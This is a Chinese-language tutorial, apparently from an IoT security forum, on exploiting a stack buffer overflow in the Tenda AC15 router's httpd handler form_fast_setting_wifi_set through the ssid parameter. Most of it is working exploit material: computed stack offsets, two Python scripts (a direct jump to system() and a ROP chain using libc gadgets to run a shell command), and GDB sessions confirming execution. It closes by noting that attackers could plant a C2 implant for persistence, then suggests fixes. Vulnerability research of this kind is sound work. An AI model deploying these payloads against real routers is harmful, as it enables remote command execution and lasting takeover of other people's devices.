# Tenda AC15 栈溢出漏洞利用
> AiMiLiYa
> 来源：https://www.iotsec-zone.com/article/455

# Tenda AC15 栈溢出漏洞利用
该固件需要系统模拟，这里给出社区屁屁大佬的文章作为参考，我也是跟着大佬模拟起来的。
[QEMU系统模拟](https://www.iotsec-zone.com/article/119#312qemu模拟)
## 第一部分：栈溢出跳转及构造原理
首先再AC15的httpd中form_fast_setting_wifi_set函数内存在栈溢出。
但是需要注意的是这里进行了两次的strcpy操作，均是对从前端获取的ssid的值进行拷贝操作
但是需要注意的是，src是一个char* 类型的指针，如果第一次覆盖掉返回地址没有注意它的话，可能导致第二个strcpy拷贝时因为src指向地址而抛异常，因此构造payload时候需要注意它的值是否指向一个正确的地址。
这里为什么不管dest呢？因为函数返回地址处于高地址处，dest相对于s来说，其起始地址所在栈上的地址要更低，因此相对于来说s离保存返回地址处的内存更加的接近。（下面会更加详细的解释）

![0.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajfc8p39c9yr6dhj.png)
根据上面的，我们首先重点关注一下其开栈的操作

![1.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajfsw9fglknaodqj.png)
假设sp初始值为0x1000
PUSH {R4,R5,R11,LR}，会类似将花括号内寄存器按照从右到左的方式进行入栈
即LR保存在0xffc地址处（以此为例，后面可能遇到该问题需要注意，按图中示例，LR数据是存储在0xffc~0x1000地址处）

![2.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajg9hn8n0ip95fpd.png)
接下来ADD R11,sp,#0xc将R11指向LR的起始地址0xffc。

![3.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajhi4vg0qdjevyby.png)
紧接着开栈为局部变量分配内存空间

![4.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajhv648t9bxizrof.png)
然后我们再回到ida中查看需要注意的那些局部变量的相对偏移，根据前面伪代码，我们可以定位到此处，首先第一个strcpy参数：目标拷贝内存为s，原数据来自于src。这里需要注意的是sub操作使用的s时，是以#-s进行操作的，下面会说到为什么。

![5.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajihf2u0hstkk17a.png)
ida移动到该函数上面，可知s值为-0x7c,src的值是-0x1c。
那么对于上图来说，sub R2,R11,#-s的操作就等价于 sub R2,R11,0x7c
同样的LDR R3,[R11,#src]等价于LDR R3,[R11-0x1c]。这里是需要注意的。

![6.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajj0b8r1oegjegfj.png)
理解了上面这些内容我们就可以绘制一个大概的栈帧图（下图）
帮助理解如何去构造，或者说为什么要这样子去构造pyload。
接着我们来看加上关键局部变量的栈帧图。
好的，那么我们可以很直观的看到，s距离函数返回地址的偏移加上R11 - (R11-0x7c) = 0x7c。
这是s的起始地址和栈上存放旧的LR的起始地址的差值，
我们需要将函数返回地址覆盖，即将栈帧图中LR的数据覆盖掉的话
那么pyload的构造形式：payload = b'a' * (0x7c) + p32(目标跳转地址)
但是仅仅是这样是不够的，前面我们提及到如果将src这个指针覆盖掉的话，指向的内存出问题会导致抛异常，程序是不会只想到我们的目标调转地址处的。因此需要对上面的payloda的基本形式进行修改：
还是根据栈帧图，s和src直接的内存距离为(R11-0x1c) -（R11-0x7c) = 0x60,然后是src指针变量占4个字节，紧接着src和LR的距离为R11-（R11-0x1c） = 0x1c,减去src自身所占字节数，我们可以构造：
payload = b'a' * (0x60) + p32(某个正常访问，最好不超过64字节的字串地址) + b'b' * (0x1c-4)+ p32(目标跳转地址)

![7.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajjmexm5klehxpxc.png)

## 第二部分：构造简单跳转exp
根据上面信息，我们可以构造栈溢出跳转的exp
```python
#!/usr/bin/python3

import requests
from pwn import *

target_ip = "192.168.3.5"
target_port = 80 

libc_base = 0x76DAB000
readable_addr = 0x76E07F5C #string WWXXP
jmp_addr = 0x76E05270 #system addr

payload = b'a' * (0x60) + p32(readable_addr) + b'b' * (0x1c-4)
payload += p32(jmp_addr) 

url = f"http://{target_ip}/goform/fast_setting_wifi_set" 
cookie = {"cookie": "password=lyucvb"}

data = {"ssid": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)

```
上面exp中额外说明，为防止0截断，我们需要去一些库函数中去寻找字符串，这样它地址较大，容易找到可以利用的字符串地址，如下图，我们在libc.so.0中找到了一个字符串。将其地址作为数据覆盖掉上面提到的src指针变量，以防第二次strcpy抛异常。

![8.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajml125knlzldpvr.png)
然后就是上面的测试exp中跳转地址是libc.so.0库内的system入口地址。
另外，为什么要用libc.so.0呢？因为程序在加载动态连接库的时候，libc.so.0是一个比较核心重要的库
它的加载顺序十分靠前，基本上都可以加载到其ImageBase。下面动态调试会看其基地址，我使用ida查看时是在调试中查看其基地址的。

下面通过gdb调试验证是否正确跳转到目标地址
```sh
./gdbserver :1337 --attach httpd_pid
gdb-multiarch httpd -x my_script.gdb
```
my_script.gdb:
```sh
set architecture arm
set endian little
target remote 192.168.3.2:1337
#栈溢出函数入口点地址
b *0x00066EE0 
#第一个strcpy（即我们利用的）
b *0x0006707C
#栈溢出函数返回代码的地址
b *0x0006775C
```
在我们发送exp之后，成功在入口点触发断点之后，单步步过查看栈的数据。
可以看见其返回地址保存在栈上的0x7efff8e4处，其存的返回地址之为0x171c8。
记下这些数据，后面我们回头再看看。
![9.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajo4f9rh0jrh4gog.png)
我们首先承接上面说的libc.so.0查看它的基地址为0x76e10000（后面会用到）
![10.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajosjzkm4qy40rqn.png)
我们执行到第一个strcpy，单步步过它，观察其确实被覆盖为我们跳转的目标地址了。
![11.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajpequzkjnzihopw.png)
这里我们c，继续执行程序到函数返回处。单步步过，成功进入到sysetm函数。基本的栈溢出跳转成功。
![12.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajq9ilijagmrqnhb.png)

## 第三部分ROP利用链构造
当然，仅仅是栈溢出跳转到某个地址是完全不够的。我们还要将其利用起来，将其成功命令执行我们的命令才行。
我们可以使用ROPgadget这个工具在libc.so.0中查找POP的一些指令，去看看哪些是我们可以去利用的，因为构造ROP链，数据都存储在栈上，需要跳转指令pop尤为重要。
工具给出的都是基于libc.so.0的基地址的偏移地址。（第二部分提过为何使用libc.so.0这个库）

![13.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajrqy5ciavoxlomm.png)
另外我们需要去调用system，而system所需参数是一个字符串，即一个char*类型的指针（R0）我们栈溢出所有的数据都是在栈上面。
+ 那么就要想办法去找类似于mov Register,sp的操作，最好是紧接着直接跳到我们目标地址，然后再去构造将寄存器参数交给R0，最后调用system即可成功达到命令执行的效果。
+ 根据上面的想法，还需要注意的一点是，mov Register,sp之后如果想直接跳转到某个地址，那么绝对不能说POP pc这种，因为它是从栈上取数据的，而上面需要构造的mov Register,sp。既要从栈上获取字符串，又要让栈上有跳转地址这种方案肯定是不可取的。那么跳转指令只能考虑BLX Register这种操作。根据上面的思路取检索

这里第一个找出了一个mov r0,sp;blx r3;的指令，其相对偏移为0x49c64。（这是作为最后一次跳转的指令，将要执行此段命令栈上sp指向的应为执行命令的字符串）
![14.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajt49udq0ik7g2jw.png)
根据上面我们找到构造出的获取参数的汇编，我们应该构造r3的值为system函数的地址。
然后再去看最开始使用ROPgadget获取相关的pop指令。
其中pop {r3,pc}就于我们上面构造寻找的指令相当的搭配。
![15.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajtlemk4kcdzm4xo.png)
现在我们拥有了 mov r0,sp;blx r3; 和pop {r3,pc}这两个代码片段的偏移。
那么我们可以这样构造ROP链。

**假设我们栈溢出地址直接执行到pop {r3,pc}代码片段**；那么要完成目标，此时sp所指向的地址存储的值应为system函数的入口地址，并且此时sp+4的位置数据应当是mov r0,sp;blx r3代码片段地址，这样就可以正确的跳转到mov r0,sp;blx r3代码片段，且跳转到此处时r3值为system地址，并且sp+8的地方数据应当为字符串所在地址，这样在指向mov r0，sp之后，执行blx r3跳转到system之后才能正确命令执行。

根据上面的思想我们绘制简易的栈帧图来查看
如下图所示，溢出之后，我们知道我们将溢出函数的返回地址覆盖为了pop {r3,pc}，溢出函数返回时会跳转到pop {r3,pc}代码块执行代码

当程序执行到pop {r3,pc}，由于如下图ida中溢出函数返回处时使用的POP {R4,R5,R11,PC},最终sp会指向溢出函数开栈前的位置，（遗忘的可以往回找我绘制的第一个栈帧图，这里直接说明）即此时sp会指向下面绘制的栈帧图的system_address的位置
那么在执行了pop {r3,pc}之后，r3将被赋值为system_address,且函数会调转到mov r0,sp;blx r3代码片段地址（这里pop {r3,pc}可以理解为先pop r3,再pop pc）

当程序执行到mov r0,sp;blx r3代码段时，此时sp指向执行命令的字符串，r3存储的是system的入口点地址，指向mov r0,sp给system传参，blx r3进入到system函数执行命令。
![16.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajutsg39i9oomhy0.png)
![17.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajuy8zhdhj4fgmds.png)

ok，根据上面的思路我们可以开始构造该exp了
ROP命令执行exp
```sh
#!/usr/bin/python3
import requests
from pwn import *

target_ip = "192.168.3.5"
target_port = 80 

libc_base = 0x76DAB000
readable_addr = 0x76E07F5C #string WWXXP
system_offset = 0x5A270 
mov_r0_sp__blx_r3__offset = 0x49c64
pop_r3_pc_offset = 0x18298

cmd = b'ps>proc_info.txt'

payload = b'a' * (0x60) + p32(readable_addr) + b'b' * (0x1c-4)
payload += p32(libc_base + pop_r3_pc_offset) + p32(libc_base + system_offset) + p32(libc_base + mov_r0_sp__blx_r3__offset) + cmd

url = f"http://{target_ip}/goform/fast_setting_wifi_set" 
cookie = {"cookie": "password=qpacvb"}

data = {"ssid": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)

```
构造出来了还不够，来动态调试验证一下。
同样的，发送exp。我们来到溢出点所在函数的返回处，n单步步过成功到我们的pop {r3,pc}代码段位置
且栈上数据sp为system函数入口点地址,sp+4为mov r0,sp;blx r3; 代码段的地址。

![18.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajw7udttttp7zhbx.png)
再次单步步过，此时我们成功进入mov r0,sp;blx r3; 代码段。
执行该代码段之后，我们将成功将ps>proc_info.txt所在栈的地址0x7efff8f0赋值给r0并跳转到r3所在地址（system函数入口点）
![19.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajwf5c1rj6iff1km.png)
即将执行system函数
![20.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajwx2qkgvdyliemw.png)
执行命令之后会崩溃，因为后续返回地址没有再进行调整了。会导致崩溃，但是命令确实是成功执行了。
下面看命令执行的成果：
![21.png](https://www.iotsec-zone.com/api/image/v2/20240808/d3ajxb860kxahntmea.png)
### 反思
那么其实攻击者在正常使用的时候可以去将自己的c2下载到路由器中，并想办法将其执行起来（比如第一次将c2拷贝进去，第二次改启动项设置c2自启动），这样其就能做到长期对路由器的控制，建议修复漏洞预防。可以开启栈保护，在拷贝字符串之前先进行字符长度判断，或者是使用更加安全的函数，例如strlcpy来替代strcpy，使得设备更加安全可靠。
